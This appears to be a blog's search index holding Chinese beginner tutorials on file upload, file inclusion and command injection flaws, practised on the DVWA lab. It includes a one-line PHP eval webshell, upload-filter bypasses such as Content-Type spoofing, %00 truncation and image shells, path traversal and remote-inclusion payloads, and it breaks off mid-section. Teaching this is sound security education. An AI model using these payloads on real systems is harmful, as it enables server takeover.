<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件上传漏洞--初识</title>
      <link href="/2020/02/06/wen-jian-shang-chuan-lou-dong/"/>
      <url>/2020/02/06/wen-jian-shang-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>文件上传漏洞是指网络攻击者<strong>上传了一个可执行的文件到服务器并执行</strong>。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p><p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。这里需要特别说明的是上传漏洞的利用经常会使用WebShell，而WebShell的植入远不止文件上传这一种方式。</p><h3 id="Webshell简介"><a href="#Webshell简介" class="headerlink" title="Webshell简介"></a>Webshell简介</h3><p>WebShell就是<strong>以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境</strong>，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，<strong>得到一个命令执行环境，以达到控制网站服务器的目的</strong>（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p><p>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员不容易发现入侵痕迹。攻击者可以将WebShell隐藏在正常文件中并修改文件时间增强隐蔽性，也可以采用一些函数对WebShell进行编码或者拼接以规避检测。除此之外，通过一句话木马的小马来提交功能更强大的大马可以更容易通过应用本身的检测，<code>&lt;?php eval($_POST[a]); ?&gt;</code>就是一个最常见最原始的小马。</p><h3 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h3><p>大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。</p><p>当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。根据具体漏洞的差异，此处上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本。</p><pre class=" language-txt"><code class="language-txt">1、上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行；2、上传文件是WebShell时，攻击者可通过这些网页后门执行命令并控制服务器；3、上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击；4、上传文件是恶意图片时，图片中可能包含了脚本，加载或者点击这些图片时脚本会悄无声息的执行；</code></pre><p>上传文件是伪装成正常后缀的恶意脚本时，攻击者可借助本地文件包含漏洞(Local File  Include)执行该文件。如将bad.php文件改名为bad.doc上传到服务器，再通过PHP的include，include_once，require，require_once等函数包含执行。</p><p>此处造成恶意文件上传的原因主要有三种：</p><p><strong>1、文件上传时检查不严</strong></p><p>没有进行文件格式检查。</p><ul><li>一些应用仅仅在客户端进行了检查，而在专业的攻击者眼里几乎所有的客户端检查都等于没有检查，攻击者可以通过NC，Fiddler等断点上传工具轻松绕过客户端的检查；</li><li>一些应用虽然在服务器端进行了黑名单检查，但是却可能忽略了大小写，如将<code>.php</code>改为<code>.Php</code>即可绕过检查；</li><li>一些应用虽然在服务器端进行了白名单检查却忽略了<code>%00</code>截断符，如应用本来只允许上传jpg图片，那么可以构造文件名为<code>xxx.php%00.jpg</code>,其中<code>%00</code>为十六进制的<code>0x00</code>字符，.jpg骗过了应用的上传文件类型检测，但对于服务器来说，因为<code>%00</code>字符截断的关系，最终上传的文件变成了<code>xxx.php</code>。</li></ul><p><strong>2、文件上传后修改文件名时处理不当</strong></p><p>一些应用在服务器端进行了完整的黑名单和白名单过滤，在修改已上传文件文件名时却百密一疏，<strong>允许用户修改文件后缀</strong>。如应用只能上传.doc文件时攻击者可以先将.php文件后缀修改为.doc，成功上传后在修改文件名时将后缀改回.php。</p><p><strong>3、使用第三方插件时引入</strong></p><p>好多应用都引用了带有文件上传功能的第三方插件，这些插件的文件上传功能实现上可能有漏洞，攻击者可通过这些漏洞进行文件上传攻击。如著名的博客平台WordPress就有丰富的插件，而这些插件中每年都会被挖掘出大量的文件上传漏洞。</p><h3 id="文件上传漏洞傻瓜式讲解。"><a href="#文件上传漏洞傻瓜式讲解。" class="headerlink" title="文件上传漏洞傻瓜式讲解。"></a>文件上传漏洞傻瓜式讲解。</h3><p><strong>（别在问我啥是webshell，别再纠结啥是webshell， <code>（在本文最后的扩展里）</code>）</strong></p><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>进入界面后就提示选择一个<code>imge</code>图片上传过去，那我就乖乖的上传一个图片吧。我就在我桌面随便选了一个图片进行上传，但是不巧的是我这“老年痴呆手”一哆嗦上传了一个<code>.txt</code>文件，就随手提交过去了，我都准备好了再次上传，结果却提示我上传成功，还返回了路径。。。。。嘿，我这就不乐意了，丫的，不是说只有图片才可以吗，他竟然骗我，不行搞它。然后我就在桌面新建了一个1.php文件，文件内容如下</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_19-17-29.png" alt></p><p>我随手就是一个上传，发现可以，成功上传并且返回了路径。那我就新打开一个界面去访问我刚上传的文件，看是否能访问。根据上图url和返回路径我推测文件url路径为</p><pre><code>http://127.0.0.1/DVWA/hackable/uploads/1.php#返回路径里有两个../../这个意思是在当前目录回退两级，所以通过回退发现回退到了DVWA目录下，经过拼接构成了上述url</code></pre><p>经测试成功访问。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_19-24-47.png" alt></p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>进入到中级发现，还是提示我们上传<code>imge</code>文件，有了刚才的经验我还能信它鬼话？不行，我就得上传个php文件，那就还把刚才在桌面写好的1.php拿过来上传吧。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_19-32-35.png" alt></p><p>嘿呦喂，竟然给我报错了，不行，我不了意了，我不开心，我生气了，我就上传1.php文件。我打开了burpsuit进行了抓包拦截查看情况发现一处可疑地方</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_19-39-20.png" alt></p><p>这里有对文件类型进行检测，我猜测如果我对<code>Content-Type: application/octet-stream</code>进行改包，改成imge图片类型也许能侥幸绕过。那我就将请求头的Content-Type改成如下格式</p><pre><code>Content-Type: image/png</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_19-49-12.png" alt></p><p>毫无疑问的我成功了，那接着咱就直接访问一下试试，发现成功了。</p><pre><code>http://127.0.0.1/DVWA/hackable/uploads/1.php#返回路径里有两个../../这个意思是在当前目录回退两级，所以通过回退发现回退到了DVWA目录下，经过拼接构成了上述url</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_19-24-47.png" alt="img"></p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>打了这么久的DVWA，你们都懂得，前面的套路肯定不行。我不说废话了，我在这里介绍一个重要的知识点吧。在高级别里，这里的后台对上传的文件本身进行了检测，用Getimagesize()的方式去检测。</p><p><strong>Getimagesize()</strong>：返回结果中有文件的大小和文件的类型，<strong>如果是图片会通过读取图片的二进制头部信息来判定图片信息。</strong></p><p>（<strong>说明</strong>：以下都是我用记事本给你们直接打开的图片文件，由于考虑到不是所有人都有16进制转换器，所以我就拿记事本简单演示一下，你们知道有这回事就行。<strong>那我就不用16进制转换器进行标准展示了</strong>。）</p><p><strong>这是个标准<code>.jpg</code>文件</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_20-54-23.png" alt></p><p><strong>这是一个标准<code>.png</code>文件</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_20-56-38.png" alt></p><p><strong>这是个标准<code>.git</code>文件</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_20-59-04.png" alt></p><p>好了，就补充这么多，你们有个印象知道这回事就行。<strong>那我说了这么多这个知识有什么用呢？</strong>你还记不记得刚才我说的<strong>如果是图片会通过读取图片的二进制头部信息来判定图片信息，</strong>那么它会对身子和尾巴判断吗？答案是不，它只看文件头，特定图片他的二进制头都是特定的，那么这就给了我们可乘之机。如果我们在图片结尾加上我们的一句话木马是不是就可以了吗。说干就干，咱就来只做个图片一句话木马。 （<strong>注：我就不演示了</strong>，我也不知道我的cmd怎么回事没法生成，老是报错。我就直接用的16进制转换器制作的，<strong>不会的话你百度一下图片马制作即可</strong>）  那我们就用制作好的图片马上传试试能否绕过。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_21-19-07.png" alt></p><p>经过访问发现只访问到了图片，并没有我们想要的信息，我们的一句话木马没有执行成功。这里需要配合文件包含漏洞进行利用，经过测试发现成功执行。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-18_21-23-51.png" alt></p><h2 id="文件解析漏洞导致文件上传漏洞"><a href="#文件解析漏洞导致文件上传漏洞" class="headerlink" title="文件解析漏洞导致文件上传漏洞"></a>文件解析漏洞导致文件上传漏洞</h2><p><strong>（这里我就不在演示，当做扩展。）</strong></p><h4 id="IIS解析漏洞导致的任意文件上传"><a href="#IIS解析漏洞导致的任意文件上传" class="headerlink" title="IIS解析漏洞导致的任意文件上传"></a><strong>IIS解析漏洞导致的任意文件上传</strong></h4><p>首先比较常见的是客户网站使用的IIS环境来搭建的，一般是IIS+PHP+Mysql数据库组合，或者是IIS+aspx+sql2005数据库，IIS存在解析漏洞，当创建文件名为.php的时候，在这个目录下的所有文件，或者代码，都会以PHP脚本的权限去运行，比如其中一个客户网站，可以将上传的目录改为1.php，那么我们上传的jpg文件到这个目录下，访问的网址是<a href="http://www.ceshi.com/1.php/1.jpg从浏览器里访问这个地址，就会是php脚本的权限运行。当上传网站木马webshell过去，就会直接拿到网站的管理权限。存在IIS解析漏洞的版本是5.0-6.0版本。" target="_blank" rel="noopener">www.ceshi.com/1.php/1.jpg从浏览器里访问这个地址，就会是php脚本的权限运行。当上传网站木马webshell过去，就会直接拿到网站的管理权限。存在IIS解析漏洞的版本是5.0-6.0版本。</a></p><h4 id="nginx解析漏洞导致的任意文件上传"><a href="#nginx解析漏洞导致的任意文件上传" class="headerlink" title="nginx解析漏洞导致的任意文件上传"></a><strong>nginx解析漏洞导致的任意文件上传</strong></h4><p> nginx是静态访问，以及大并发，能够承载多人访问，目前很多网站都在使用的一种服务器环境，简单来讲就是HTTP访问的代理，高速稳定，深受很多网站运营者的喜欢，在nginx最低版本中存在解析漏洞，可以导致运行PHP脚本文件，漏洞产生的原因是由于php.ini配置文件与nginx配合解析的时候，将默认的后缀名认为是最重的文件名，导致可以修改后缀名来执行PHP文件。我们SINE安全在渗透测试中发现客户网站开启nginx以及fast-cgi模式后，就会很容易的上传网站木马到网站目录中，我们将jpg图片文件插入一句话木马代码，并上传到网站的图片目录中。我们在访问这个图片的时候，直接在后面输入/1.php，就会导致图片文件以php脚本权限来运</p><h4 id="apache解析漏洞导致的任意文件上传"><a href="#apache解析漏洞导致的任意文件上传" class="headerlink" title="apache解析漏洞导致的任意文件上传"></a><strong>apache解析漏洞导致的任意文件上传</strong></h4><p> apache也是目前使用较多的一个服务器环境，尤其php网站使用的较多，因为稳定，快速，易于PHP访问，可以将第三方的一些开发语言编译到网站中，apache也是存在漏洞的，尤其在apache1.0-2.0版本中，后缀名判断这里没有做详细的规定，导致可以绕过apache安全机制，上传恶意的文件名。默认是允许多个后缀名进行解析的，如果命名的后缀名不被apache认可解析，就会向前寻找后缀名，直到后缀名是apache认可的，就会直接解析成功。 该文件上传漏洞使用的条件是需要开启module模式，不是这个模式的上传不了。我们SINE安全在对客户网站进行渗透测试的时候，首先会改后缀名为apache不认可的，然后POST上传过去，直接运行php脚本。</p><h2 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h2><h3 id="文件上传漏洞傻瓜式讲解。（别在问我啥是webshell，别再纠结啥是webshell，）"><a href="#文件上传漏洞傻瓜式讲解。（别在问我啥是webshell，别再纠结啥是webshell，）" class="headerlink" title="文件上传漏洞傻瓜式讲解。（别在问我啥是webshell，别再纠结啥是webshell，）"></a>文件上传漏洞傻瓜式讲解。（别在问我啥是webshell，别再纠结啥是webshell，）</h3><h4 id="1、背景"><a href="#1、背景" class="headerlink" title="1、背景"></a>1、背景</h4><p>现代的互联网的Web应用程序中，文件上传是一种常见的要求，因为它有助于提高业务效率。在Facebook和Twitter等社交网络的Web应用程序中都允许文件上传功能。在博客，论坛，电子银行网络，YouTube和企业支持门户，会给用户和企业员工有效的共享文件。允许用户上传图片，视频，头像和许多其他类型的文件。</p><p><strong>什么是文件上传</strong></p><ul><li>上传头像</li><li>插入图片</li><li>上传附件<br> ······</li></ul><p><strong>为什么会有文件上传</strong><br> 在网站运营过程中，不可避免地要对网站的某些页面或者内容进行更新，这个时候需要使用到网站的文件上传功能。如果不对被上传的文件进行限制或者限制被绕过，该功能便有可能会被利用上传可执行文件、脚本文件到服务器上，进而进一步导致服务器沦陷。</p><p><strong>什么是文件上传漏洞</strong><br> 上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。</p><h4 id="2、危害"><a href="#2、危害" class="headerlink" title="2、危害"></a>2、危害</h4><ul><li>网站被控制，对文件增删改查，执行命令，链接数据库</li><li>如果服务器长久未更新，可以利用exp提权，导致服务器沦陷</li><li>同服务器的其他网站沦陷</li></ul><p><strong>哪里存在文件上传漏洞</strong></p><ol><li>有上传文件的功能</li><li>且上传到的目录，能够解析脚本语言（否则，405）</li><li>能够访问到上传的文件就有可能存在文件上传漏洞。</li></ol><p><strong>导致文件上传漏洞的原因较多，主要包括以下几类：</strong></p><ul><li>服务器配置不当（iis6.0 put 直接写文件）</li><li>本地文件上传限制被绕过（javascript验证）</li><li>服务端过滤不严格被绕过 （）</li><li>文件路径截断 （0x00）</li><li>文件解析漏洞导致文件执行(iis,apache,nginx)</li><li>开源编辑器上传漏洞(fckeditor 自定义文件名，文件夹结合iis6.0解析漏洞，杀伤力*****ewebeditor ：可以登录后台，配置允许上传的文件类型.asp)</li></ul><p><strong>服务器配置不当</strong><br> 当服务器配置不当时，在不需要上传页面的情况下便可导致任意文件上传。(PUT协议)iis6.0</p><p><strong>本地文件上传限制被绕过</strong><br> 只在客户端浏览器上做了文件限制而没有在远程的服务器上做限制，只需要修改数据包就可以轻松绕过限制。</p><p><strong>过滤不严格或被绕过</strong><br> 有一些网站使用了黑名单过滤掉了一些关键的可执行脚本文件后缀。但黑名单不全或者被绕过，比如服务端过滤掉了后缀为  .php的文件，但是没有过滤掉.php3等其他可执行的脚本文件后缀，攻击者就可以上传其他的可执行的脚本文件后缀到服务器上。禁止了php,asp,jsp,但是没有禁止php3,asa,cer,cdx等等</p><p><strong>常用的一些可执行的文件脚本后缀：</strong><br> .php .php2 .php3 .php5 .phtml<br> .asp .aspx .ascx .ashx<br> .cer .asa .cdx<br> .jsp .jspx<br> .py</p><p><strong>过滤不严格或被绕过</strong><br> • 某些情况下管理员错误的服务器配置会导致.html、.xml等静态页面后缀的文件也可被执行。<br> • 多文件上传时，有时服务器只对第一个上传的文件进行了检查，这时通过上传多个文件并将恶意文件掺杂进其中也可绕过服务器的过滤。</p><p><strong>文件路径截断</strong><br> 在上传的文件中使用一些特殊的符号，使得文件被上传到服务器中时路径被截断从而控制文件路径。常用的进行文件路径截断的字符如下：</p><blockquote><ul><li>\0</li><li>？</li><li>%00</li></ul></blockquote><p>在可以控制文件路径的情况下，使用超长的文件路径也有可能会导致文<br> 件路径截断。asdfasdfasdfasdfasdasdfasdf.jpg</p><p><strong>文件解析漏洞</strong><br> 当服务器存在解析漏洞时，合法的文件名便可导致带有恶意代码的文件被执行，详情参见解析漏洞。iis,apache,nginx</p><p><strong>开源编辑器上传漏洞</strong><br> 很多开源的编辑器历史都有不同的上传漏洞，详情可见：编辑器漏洞手册。</p><h4 id="3、文件上传漏洞的利用"><a href="#3、文件上传漏洞的利用" class="headerlink" title="3、文件上传漏洞的利用"></a>3、文件上传漏洞的利用</h4><p><strong>利用</strong></p><ul><li>找到上传点，尝试上传脚本文件</li><li>上传成功，访问上传的脚本文件</li><li>上传失败，采取过滤绕过方法</li></ul><p><strong>漏洞挖掘</strong></p><ul><li>查找上传点，图片，附件，头像等等</li><li>目录、文件扫描发现 类似upload.php等文件</li><li>目录、文件扫描 编辑器目录如ewebEditor、fckeditor、kingeditor。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA_文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含初识</title>
      <link href="/2020/02/04/wen-jian-bao-han/"/>
      <url>/2020/02/04/wen-jian-bao-han/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><strong>（说明：这篇主要写给初学的学弟，以便他们操作参考，内无干货，大佬勿喷）</strong></p><h2 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h2><h4 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h4><blockquote><p>简单一句话，为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。</p></blockquote><h4 id="文件包含简介"><a href="#文件包含简介" class="headerlink" title="文件包含简介"></a>文件包含简介</h4><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>文件包含就是一个文件里面包含另外一个文件。一开始接触的时候是因为php里面，但是查找了一些资料这个存在在很多语言里面。程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-16_14-34-49.png" alt></p><h4 id="两种类型"><a href="#两种类型" class="headerlink" title="两种类型"></a>两种类型</h4><ul><li>本地文件包含</li><li>远程文件包含</li></ul><h4 id="补充知识：PHP文件包含的函数"><a href="#补充知识：PHP文件包含的函数" class="headerlink" title="补充知识：PHP文件包含的函数"></a>补充知识：PHP文件包含的函数</h4><ul><li>include( )<br> 当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含<br> 进来，发生错误时之给出一个警告，继续向下执行。</li><li>include_once( )<br> 功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次</li><li>require( )<br> require()与 include()的区别在于 require()执行如果发生错误，函数会输出<br> 错误信息，并终止脚本的运行。</li><li>require_once( )<br> 功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。</li></ul><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>进入界面后有三个文件选项，可以任意点击读取，但是仔细的同学会发现其中有些玄机。我们每点击阅读对应的文件在url中就会显示对应文件名称。如下图所示：</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-16_14-42-16.png" alt></p><p>那么我们想一下，<strong>它除了能读这几个文件，还能读其它文件吗？</strong>我们抱着试试的想法来实验一番吧。那我们就读取一下DVWA目录下的php.ini文件payload如下</p><pre><code>#直接拼接在page=  后边../../php.ini</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-16_14-54-43.png" alt></p><p>发现读取成功，<strong>那我们思考一下这里能不能读取远程文件呢？</strong>我们在WWW目录下创建如下文件命名为phpinfo.txt</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>  <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>payload如下</p><pre><code>#直接拼接在page=  后边http://127.0.0.1/phpinfo.txt</code></pre><p>接着我们尝试读取一下这个文件，发现真的就跳转到了我们的熟悉的phpinfo界面了</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-16_15-01-31.png" alt></p><p><strong>（说明：远程文件包含顾名思义应该是远程主机包含，但是这里我用本地机环境模拟远程主机，主要为了降低复现难度。）</strong></p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>我们按惯例输入Low等级的payload，发现没有返回任何信息。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-16_15-10-11.png" alt></p><p>我们猜测，这里可能过滤了 <code>../</code>那我们就试试<code>..\</code>反斜杠能否读取。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-16_15-12-52.png" alt></p><p>经测试发现没问题，那我们还来思考一下这里能否进行远程文件包含？<strong>（注：依然采用刚才的文件和路径）</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-16_15-31-00.png" alt></p><p>那我们就尝试一下变换payload，变换后的payload如下</p><p><strong>（注:经过对XSS和SQL注入的学习，我想你们对绕过变换payload有一定认知了，所以这里就不在废话带领你们探究绕过）</strong></p><pre><code>#直接拼接在page=  后边#这条是失败payloadhttp://http://127.0.0.1/phpinfo.txt#这个条是有效payloadhttphttp://://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-16_15-36-58.png" alt></p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p><strong>废话不在多说</strong>，前面的payload肯定已经不可以在使用了，这里我就不在演示了。这里的读取需要用到伪协议的方法，接下来我带大家了解一下伪协议吧。</p><p>这种特别的伪协议可以放在任意URL之前，它指示将取回的内容强制进行特殊的解码或者渲染显示。这一类别里最广为人知的例子就是Firefox和Chrome支持的view-source:协议了，它会按照整齐的排版格式显示HTML页面的源代码。这个协议的用法如下：view-source:<a href="http://www.example.com/其他的类似协议包括" target="_blank" rel="noopener">http://www.example.com/其他的类似协议包括</a> jar:，Firefox可以通过这个协议解压这种类似ZIP的文件内容；wyciwyg:和view-cache:分别为Firefox和 Chrome浏览器访问缓存的方式；oddballfeed: 协议用于在Safari里获得新闻推送信息17；另外还有一堆与Windows 帮助系统和其他Windows 组件有关的协议，这类协议的支持文档很差也鲜有资料可查（hcp:、its:、mhtml:、mk:、ms-help:、ms-its:和ms-itss:）。</p><p>许多封装型协议的共同特点是，攻击者通过这种方式，隐藏最后实际是由浏览器处理的真实URL地址，如view-source:javascript：（或甚至写成这样：view-source:view-source:javascript：），后面再跟一段恶意代码，就能达到目的。可能会有一些安全限制以避免这种漏洞，但通常这类限制都不太能指靠得上。另一个重要的问题是，尤其是在微软的mhtml:协议里，它可能会忽略服务器返回的HTTP 内容设置指令18，而产生广泛的影响。</p><p><strong>PHP伪协议事实上就是支持的协议与封装协议（12种）</strong></p><p>a. file:// — 访问本地文件系统</p><p>b. http:// — 访问 HTTP(s) 网址</p><p>c. ftp:// — 访问 FTP(s) URLs</p><p>d. php:// — 访问各个输入/输出流（I/O streams）</p><p>e. zlib:// — 压缩流</p><p>f. data:// — 数据（RFC 2397）</p><p>g. glob:// — 查找匹配的文件路径模式</p><p>h. phar:// — PHP 归档</p><p>i. ssh2:// — Secure Shell 2</p><p>j. rar:// — RAR</p><p>k. ogg:// — 音频流</p><p>l. expect:// — 处理交互式的流</p><p><strong>（ 听我胡说：</strong>你就这么理解，类似可代替http协议，但是协议内容不同）</p><p>那我们就尝试着用file协议来读取一下本地文件吧，payload如下：</p><pre><code>file://D:\phpstudy_pro\WWW\phpinfo.txt</code></pre><p><strong>发现成功执行</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-16_16-11-41.png" alt></p><h2 id="我想说的是"><a href="#我想说的是" class="headerlink" title="我想说的是"></a>我想说的是</h2><p>关于文件包含漏洞有很多的知识点，如文件包含的函数，文件包含一句话木马，各种伪协使用这里由于篇幅有限，我不在多说，我会在写一篇文件包含扩展知识。</p><p><strong>（这篇主要写给初学的学弟，以便他们操作参考 ，内无干货，大佬勿喷，下篇扩展我会好好写）</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA_文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE_命令注入漏洞--初识</title>
      <link href="/2020/02/02/rce-ming-ling-zhu-ru-lou-dong/"/>
      <url>/2020/02/02/rce-ming-ling-zhu-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE——命令注入漏洞"><a href="#RCE——命令注入漏洞" class="headerlink" title="RCE——命令注入漏洞"></a>RCE——命令注入漏洞</h1><h2 id="初识：命令注入漏洞概述"><a href="#初识：命令注入漏洞概述" class="headerlink" title="初识：命令注入漏洞概述"></a>初识：命令注入漏洞概述</h2><h3 id="Commad-Inject漏洞产生原因及如何注入："><a href="#Commad-Inject漏洞产生原因及如何注入：" class="headerlink" title="Commad Inject漏洞产生原因及如何注入："></a>Commad Inject漏洞产生原因及如何注入：</h3><p>在web程序中，因为业务功能需求，需要通过web前端传递参数到后台服务器上执行（特别是一些网络设备的web管理界面），但由于开发人员没有对输入进行严格的过滤，导致攻击着可以构造一些额外的“带有非法目的”的命令，欺骗后台服务器执行，造成破坏。<strong>以下三点缺一不可</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_13-28-41.png" alt></p><h3 id="Commad-Inject漏洞描述："><a href="#Commad-Inject漏洞描述：" class="headerlink" title="Commad Inject漏洞描述："></a>Commad Inject漏洞描述：</h3><p>Command  Injection，即命令注入攻击，是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。在命令注入的漏洞中，最为常见的是PHP的命令注入。PHP命令注入攻击存在的主要原因是Web应用程序员在应用PHP语言中一些具有命令执行功能的函数时，对用户提交的数据内容没有进行严格的过滤就带入函数中执行而造成的。例如，当黑客提交的数据内容为向网站目录写入PHP文件时，就可以通过该命令注入攻击漏洞写入一个PHP后门文件，进而实施下一步渗透攻击。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_13-29-42.png" alt></p><h3 id="Commad-Inject漏洞危害："><a href="#Commad-Inject漏洞危害：" class="headerlink" title="Commad Inject漏洞危害："></a>Commad Inject漏洞危害：</h3><p>如果web应用使用的是root权限，则该漏洞可以导致攻击着在服务器上执行任意命令。</p><h3 id="补充知识：补充一些常用的管道符："><a href="#补充知识：补充一些常用的管道符：" class="headerlink" title="补充知识：补充一些常用的管道符："></a>补充知识：补充一些常用的管道符：</h3><h4 id="Windows系统支持的管道符如下："><a href="#Windows系统支持的管道符如下：" class="headerlink" title="Windows系统支持的管道符如下："></a>Windows系统支持的管道符如下：</h4><ol><li>“|”：直接执行后面的语句。</li><li>“||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol><h4 id="Linux系统支持的管道符如下："><a href="#Linux系统支持的管道符如下：" class="headerlink" 